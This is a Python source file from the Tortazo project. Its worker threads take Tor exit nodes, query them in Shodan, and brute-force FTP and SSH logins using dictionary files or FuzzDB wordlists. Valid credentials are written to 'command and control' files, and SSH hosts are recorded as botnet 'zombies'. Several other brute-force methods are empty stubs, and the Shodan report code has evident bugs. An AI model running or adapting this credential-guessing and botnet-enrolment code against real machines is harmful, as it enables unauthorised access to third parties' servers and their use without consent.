# coding=utf-8
'''
Created on 22/01/2013
@author: Adastra
WorkerThread.py

WorkerThread is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

WorkerThread is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

import threading
from stem.util import term
from shodan.api import WebAPIError
from shodan import WebAPI
import Queue
import paramiko
import os
import ftplib
import sys

class WorkerThread(threading.Thread):
    '''
	Worker Thread to information gathering and attack the exit nodes found.
	'''
    def __init__(self, queue, tid, cli) :
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid
        self.cli = cli
        #This maps to the function name and port number.
        self.bruteForcePorts ={'ftpBrute':21, 'sshBrute':22, 'telnetBrute':23, 'httpBrute':80, 'snmpBrute':161}

        if self.cli.useShodan == True:
            #Using Shodan to search information about this machine in shodan database.
            self.cli.logger.info(term.format("[+] Shodan Activated. About to read the Development Key. ", term.Color.YELLOW))
            if self.cli.shodanKey == None:
                #If the key is None, we can't use shodan.
                self.cli.logger.warn(term.format("[-] Shodan Key's File has not been specified. We can't use shodan without a valid key", term.Color.RED))
            else:
                #Read the shodan key and create the WebAPI object.
                shodanKey = open(self.cli.shodanKey).readline().rstrip('\n')
                self.shodanApi = WebAPI(shodanKey)
                self.cli.logger.debug(term.format("[+] Connected to Shodan using Thread: %s " %(self.tid), term.Color.GREEN))

    def run(self) :
        lock = threading.Lock()
        while True :
            lock.acquire()
            host = None
            try:
                values = self.queue.get()
                self.ip, self.descriptor = values[0]
                self.ports = values[1]

                if hasattr(self, 'shodanApi'):
                    self.cli.logger.debug(term.format("[+] Using Shodan against %s " %(self.ip), term.Color.GREEN))
                    try:
                        shodanResults = self.shodanApi.host(self.ip)
                        self.recordShodanResults(self, self.ip, shodanResults)
                    except WebAPIError:
                        self.cli.logger.error(term.format("[-] There's no information about %s in the Shodan Database." %(self.ip), term.Color.RED))
                        pass
                if self.cli.brute is True:
                    #if self.cli.dictFile is not None:
                    for method in self.bruteForcePorts.keys():
                        if self.bruteForcePorts[method] in self.ports:
                            #Open port detected for a service supported in the "Brute-Forcer"
                            #Calling the method using reflection.
                            containedMethod = getattr(self, method)
                            if callable(containedMethod):
                                containedMethod()
                    #else:
                    #    self.cli.logger.warn(term.format("[-] BruteForce mode specified but there's no files for users and passwords. Use -f option", term.Color.RED))
            except Queue.Empty :
                self.cli.logger.debug(term.format("[+] Worker %d exiting... "%self.tid, term.Color.GREEN))
            finally:
                self.cli.logger.debug(term.format("[+] Releasing the Lock in the Thread %d "%self.tid, term.Color.GREEN))
                lock.release()
                self.queue.task_done()

    def ftpBrute(self):
        self.cli.logger.debug(term.format("[+] Starting FTP BruteForce mode on Thread: %d "%self.tid, term.Color.GREEN))
        ftpFileName = 'commandandcontrolftp.txt'
        self.cli.logger.debug(term.format("[+] Trying Anonymous access in: %s "%(self.ip), term.Color.GREEN))
        try:
            ftpClient = ftplib.FTP(self.ip)
            ftpClient.login()
            self.cli.logger.debug(term.format("[+] Anonymous access allowed in: %s "%(self.ip), term.Color.GREEN))
            ftpFile = open(ftpFileName, 'a')
            entry = '%s:%s:%s' %(self.ip, 'anonymous', 'anonymous')
            ftpFile.write(entry+'\n')
            ftpFile.close()
        except:
            self.cli.logger.debug(term.format("[-] Anonymous access is not allowed in: %s "%(self.ip), term.Color.GREEN))

        if(self.cli.dictFile is not None and os.path.exists(self.cli.dictFile)):
            self.cli.logger.debug(term.format("[+] Reading the Passwords file %s " %(self.cli.dictFile), term.Color.GREEN))
            for line in open(self.cli.dictFile, "r").readlines():
                [user, passwd] = line.strip().split()
                try :
                    ftpClient = ftplib.FTP(self.ip)
                    ftpClient.login(user, passwd)
                except:
                    continue
                if ftpClient:
                    self.cli.logger.info(term.format("[+] FTP Bruteforcer Success ... username: %s and passoword %s is VALID! " % (user, passwd), term.Color.YELLOW))
                    ftpClient.quit()
                    ftpFile = open(ftpFileName, 'a')
                    entry =  '%s:%s:%s' %(self.ip, user, passwd)
                    ftpFile.write(entry+'\n')
                    ftpFile.close()
                    ftpClient.close()
        else:
            self.cli.logger.debug(term.format("[+] passwords file not found on the path %s. Now, we'll use FuzzDB!" %(self.cli.dictFile), term.Color.RED))

    def sshBrute(self):
        '''
        Perform the SSH Bruteforce attack.
        '''
        self.cli.logger.debug(term.format("[+] Starting SSH BruteForce mode on Thread: %d " %self.tid, term.Color.GREEN))

        if(self.cli.dictFile is not None and os.path.exists(self.cli.dictFile)):
            self.cli.logger.debug(term.format("[+] Reading the Passwords file %s " %(self.cli.dictFile), term.Color.GREEN))
            for line in open(self.cli.dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.cli.SEPARATOR)
                if self.performSSHConnection(user, passwd):
                    break

        else:
            self.cli.logger.warn(term.format("[-] Dictionary file not found on the path %s" %(self.cli.dictFile), term.Color.RED))
            usersList = self.getUserlistFromFuzzDB()
            passList = self.getPasslistFromFuzzDB()

            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for passwd in passList:
                    if self.performSSHConnection(user, passwd):
                        stop_attack = True
                        break


    def telnetBrute(self):
        '''
        Perform a bruteforce attack against the Telnet service discovered.
        '''
        pass

    def httpBrute(self):
        '''
        Perform a bruteforce attack against the HTTPD service discovered.
        Uses FuzzDB to execute bruteforce attacks if there's no dictionary file.
        '''
        pass

    def snmpBrute(self):
        '''
        Perform a bruteforce attack against the SNMP service discovered.
        Uses FuzzDB to execute bruteforce attacks if there's no dictionary file.
        '''
        pass

    def smtpBrute(self):
        '''
        Perform a bruteforce attack against the SMTP service discovered.
        Uses FuzzDB to execute
        '''
        pass


    def performSSHConnection(self, user, passwd):
        tortazoFile = 'tortazo_botnet.bot'
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sshFileName = 'commandandcontrolssh.txt'
        try:
            client.connect(self.ip, username=user, password=passwd)
        except paramiko.AuthenticationException:
            return False
        self.cli.logger.info(term.format("[+] SSH Bruteforce Success ... username: %s and password %s is VALID! " % (user, passwd), term.Color.YELLOW))
        client.close()
        sshFile = open(sshFileName, 'a')
        entry =  '%s:%s:%s' %(self.ip, user, passwd)
        sshFile.write(entry+'\n')
        sshFile.close()
        self.cli.logger.debug(term.format("[+] Updating the file 'tortazo_botnet.bot' with the new Zombie", term.Color.GREEN))

        try:
            tortazoFd = open(tortazoFile, 'a')
        except:
            print sys.exc_info()

        #host:user:pass:port:nickname
        nickname = '--'
        if self.descriptor:
            nickname = self.descriptor.nickname
        entryBotnet = '%s:%s:%s:%s:%s' %(self.ip, user, passwd, '22', nickname)
        content = open(tortazoFile, 'r').readlines()
        if entryBotnet in content:
            self.cli.logger.debug(term.format("[-] Entry duplicated. Server already added in the 'tortazo_botnet.bot' file", term.Color.GREEN))
        else:
            tortazoFd.write(entryBotnet)
            self.cli.logger.debug(term.format("[+] Entry %s added" %(entry), term.Color.GREEN))
            tortazoFd.close()
            return True

    def getUserlistFromFuzzDB(self):
        '''
        Reads:
        fuzzdb/wordlists-user-passwd/names/namelist.txt
        fuzzdb/wordlists-user-passwd/passwds/john.txt
        fuzzdb/wordlists-user-passwd/unix-os/unix-users.txt
        fuzzdb/wordlists-user-passwd/faithwriters.txt

        and returns a list of words (used as possible usernames)
        '''
        self.cli.logger.debug(term.format("[+] Generating users list using the files in FuzzDB", term.Color.GREEN))
        users = []
        try:
            namelist = open('fuzzdb/wordlists-user-passwd/names/namelist.txt', 'r')
            johnlist = open('fuzzdb/wordlists-user-passwd/passwds/john.txt', 'r')
            unixusers = open('fuzzdb/wordlists-user-passwd/unix-os/unix_users.txt', 'r')
            faithwriters = open('fuzzdb/wordlists-user-passwd/faithwriters.txt', 'r')
        except:
            print sys.exc_info()

        for userNameList in namelist.readlines():
            users.append(userNameList)

        for userJohnList in johnlist.readlines():
            users.append(userJohnList)

        for userunix in unixusers.readlines():
            users.append(userunix)

        for userfaithwriter in faithwriters.readlines():
            users.append(userfaithwriter)
        return users

    def getPasslistFromFuzzDB(self):
        '''
        Reads:
        fuzzdb/wordlists-user-passwd/passwds/john.txt
        fuzzdb/wordlists-user-passwd/unix-os/unix-passwords.txt
        fuzzdb/wordlists-user-passwd/weaksauce.txt

        and returns a list of words (used as possible usernames)
        '''
        self.cli.logger.debug(term.format("[+] Generating passwords list using the files in FuzzDB", term.Color.GREEN))
        passwords = []
        johnlist = open('fuzzdb/wordlists-user-passwd/passwds/john.txt', 'r')
        unixpasswords = open('fuzzdb/wordlists-user-passwd/unix-os/unix_passwords.txt', 'r')
        weaksauce = open('fuzzdb/wordlists-user-passwd/passwds/weaksauce.txt', 'r')

        for johnpass in johnlist.readlines():
            passwords.append(johnpass)

        for unixpass in unixpasswords.readlines():
            passwords.append(unixpass)

        for wealsauce in weaksauce.readlines():
            passwords.append(wealsauce)

        return passwords

    def recordShodanResults(self, host, results):
        entryFile = 'shodanScan-%s.txt' %(host)
        shodanFileResults = open(entryFile, 'a')
        entry = '------- SHODAN REPORT START FOR %s ------- \n' %(host)
        self.recursiveInfo(entry, results)
        entry += '------- SHODAN REPORT END FOR %s ------- \n' %(host)
        shodanFileResults.write(entry)
        shodanFileResults.close()
        self.cli.logger.debug("[+] Shodan File Created.")

    def recursiveInfo(self, entry, data):
        if type(data) == dict:
            for key in self.results.keys():
                if type(key) == dict:
                    entry += self.recursiveInfo(entry, key)
                elif type(key) == list:
                    for element in key:
                        if type(key) == dict:
                            entry += self.recursiveInfo(entry, key)
                else:
                    entry += '[+]%s : %s \n' %(key, self.results[key])